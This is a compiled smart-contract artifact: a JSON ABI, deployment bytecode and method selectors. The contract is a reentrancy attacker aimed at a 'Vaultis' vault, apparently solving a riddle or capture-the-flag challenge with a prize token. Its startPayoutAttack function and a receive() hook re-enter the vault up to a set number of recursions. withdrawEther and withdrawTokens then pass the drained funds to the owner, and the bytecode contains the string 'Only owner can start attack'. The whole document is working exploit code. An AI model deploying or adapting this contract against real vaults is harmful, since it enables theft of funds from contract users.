{"abi":[{"type":"constructor","inputs":[{"name":"_vaultisAddress","type":"address","internalType":"address payable"},{"name":"_prizeTokenAddress","type":"address","internalType":"address"},{"name":"_riddleId","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"currentRecursion","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"maxRecursions","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"payoutAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"prizeToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC20"}],"stateMutability":"view"},{"type":"function","name":"riddleId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"startPayoutAttack","inputs":[{"name":"_payoutAmount","type":"uint256","internalType":"uint256"},{"name":"_maxRecursions","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"vaultis","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Vaultis"}],"stateMutability":"view"},{"type":"function","name":"withdrawEther","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"withdrawTokens","inputs":[{"name":"tokenAddress","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60a0346100c757601f6107b238819003918201601f19168301916001600160401b038311848410176100cb578084926060946040528339810103126100c75780516001600160a01b03811691908290036100c75760208101516001600160a01b03811691908290036100c757604001519160018060a01b03195f5416175f5560018060a01b031960015416176001556080523360018060a01b031960025416176002556040516106d290816100e08239608051818181608c0152818161018301526102c90152f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe608060405260043610156100f3575b3615610018575f80fd5b600454600554811061002657005b5f1981146100df5760010160045560408051906100438183610585565b60018252601f1981013660208401373061005c836105bb565b525f546001600160a01b0316803b156100db57815163c8e728f960e01b8152925f9184918290849082906100b4907f0000000000000000000000000000000000000000000000000000000000000000600484016105dc565b03925af19081156100d257506100c657005b5f6100d091610585565b005b513d5f823e3d90fd5b5f80fd5b634e487b7160e01b5f52601160045260245ffd5b5f5f3560e01c806349df728c146104365780635bdf457d1461040f5780636b46c8c3146103f25780637362377b146103a2578063777343e2146102375780638da5cb5b1461020e57806393a5a240146101f0578063a2253e7f146101d2578063d0ef024a146101a95763ec05cc691461016c575061000e565b346101a657806003193601126101a65760206040517f00000000000000000000000000000000000000000000000000000000000000008152f35b80fd5b50346101a657806003193601126101a6576001546040516001600160a01b039091168152602090f35b50346101a657806003193601126101a6576020600454604051908152f35b50346101a657806003193601126101a6576020600554604051908152f35b50346101a657806003193601126101a6576002546040516001600160a01b039091168152602090f35b50346100db5760403660031901126100db576002546001600160a01b0316330361035d576004356003556024356005555f60045560409081519161027b8184610585565b60018352601f19810136602085013730610294846105bb565b525f80546001600160a01b031693909290843b156100db575f6102f16020968293865194858094819363c8e728f960e01b83527f0000000000000000000000000000000000000000000000000000000000000000600484016105dc565b03925af19081610348575b5061033e578060033d1161032d575b506308c379a01461031f575b519015158152f35b610327610625565b50610317565b9050600481803e5160e01c5f61030b565b5060019150610317565b6103559192505f90610585565b5f905f6102fc565b60405162461bcd60e51b815260206004820152601b60248201527f4f6e6c79206f776e65722063616e2073746172742061747461636b00000000006044820152606490fd5b346100db575f3660031901126100db575f80808060018060a01b03600254166103cc813314610539565b47908282156103e9575bf1156103de57005b6040513d5f823e3d90fd5b506108fc6103d6565b346100db575f3660031901126100db576020600354604051908152f35b346100db575f3660031901126100db575f546040516001600160a01b039091168152602090f35b346100db5760203660031901126100db576004356001600160a01b038116908190036100db576002546001600160a01b0316610473338214610539565b6040516370a0823160e01b815230600482015290602082602481865afa9182156103de575f92610504575b509060446020925f604051958694859363a9059cbb60e01b8552600485015260248401525af180156103de576104d057005b6020813d6020116104fc575b816104e960209383610585565b810103126100db5751801515036100db57005b3d91506104dc565b91506020823d602011610531575b8161051f60209383610585565b810103126100db57905190604461049e565b3d9150610512565b1561054057565b60405162461bcd60e51b815260206004820152601760248201527f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006044820152606490fd5b90601f8019910116810190811067ffffffffffffffff8211176105a757604052565b634e487b7160e01b5f52604160045260245ffd5b8051156105c85760200190565b634e487b7160e01b5f52603260045260245ffd5b6060602091604081019381526040838201528451809452019201905f5b8181106106065750505090565b82516001600160a01b03168452602093840193909201916001016105f9565b5f60443d1061068b576040513d600319016004823e8051913d602484011167ffffffffffffffff841117610696578282019283519167ffffffffffffffff831161068e573d8401600319018584016020011161068e575061068b92910160200190610585565b90565b949350505050565b9291505056fea264697066735822122085a623df709773b9244d899c66227390bda2c09ebb8cf0551597d4ffd36cdc4a64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"currentRecursion()":"a2253e7f","maxRecursions()":"93a5a240","owner()":"8da5cb5b","payoutAmount()":"6b46c8c3","prizeToken()":"d0ef024a","riddleId()":"ec05cc69","startPayoutAttack(uint256,uint256)":"777343e2","vaultis()":"5bdf457d","withdrawEther()":"7362377b","withdrawTokens(address)":"49df728c"},"id":4}